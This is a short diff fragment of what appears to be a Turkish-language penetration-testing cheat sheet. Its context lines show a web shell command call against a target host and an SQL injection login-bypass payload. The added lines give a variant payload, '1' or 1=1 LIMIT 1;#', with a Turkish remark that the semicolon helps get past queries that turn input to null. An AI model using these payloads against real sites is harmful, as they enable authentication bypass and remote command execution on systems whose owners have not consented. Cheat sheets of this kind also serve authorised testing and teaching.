@@ -79,6 +79,8 @@ http://<targetip>/shell.php?cmd=id
 -----------------------------------
 #SQL İnjection login bypass
 1 ' or 1 = 1 LIMIT <limit sayisi> -- +
+yada : 
+1' or 1=1 LIMIT 1;# : burada ki fark ne gelirse gelsin null çeviren sql querylere karşı " ; " noktalı virgül koyarak bypass etmek.
 
 ----------------------------------
 # Time based 
